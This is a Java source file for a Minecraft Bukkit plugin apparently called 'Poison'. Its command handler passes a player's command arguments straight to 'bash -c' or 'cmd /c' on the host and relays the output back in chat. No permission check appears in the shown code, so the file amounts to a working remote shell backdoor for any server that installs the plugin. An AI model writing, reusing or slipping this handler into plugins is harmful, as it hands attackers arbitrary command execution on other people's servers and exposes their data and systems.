package pl.workonfire.minecraft.poison.commands;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import pl.workonfire.minecraft.poison.Poison;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

public class SystemHandler implements CommandExecutor {

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (args.length > 0) {
            Bukkit.getScheduler().runTaskAsynchronously(Poison.getInstance(), () -> {
                String systemCommand = String.join(" ", args);
                long startTime = System.nanoTime();
                sender.sendMessage(Poison.getPrefix() + "§cExecuting system command §7§o" + systemCommand + "§r...");
                try {
                    String commandInterpreter;
                    if (System.getProperty("os.name").contains("Windows")) commandInterpreter = "cmd /c";
                    else commandInterpreter = "bash -c";
                    Process process = Runtime.getRuntime().exec(commandInterpreter + " " + systemCommand);
                    process.waitFor();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    List<String> output = new ArrayList<>();
                    String line;
                    while ((line = reader.readLine()) != null) output.add(line + "\n");
                    if (!output.isEmpty()) for (String outputLine : output) sender.sendMessage(outputLine);
                    long stopTime = System.nanoTime();
                    sender.sendMessage(Poison.getPrefix() + "§aCommand execution finished in §f" + (stopTime - startTime) / 1000000 + " ms");
                } catch (IOException | InterruptedException exception) {
                    sender.sendMessage(Poison.getPrefix() + "§4Error.");
                }
            });
        }
        else sender.sendMessage("§4§l§oPoison §fv" + Poison.getPluginVersion());
        return true;
    }
}
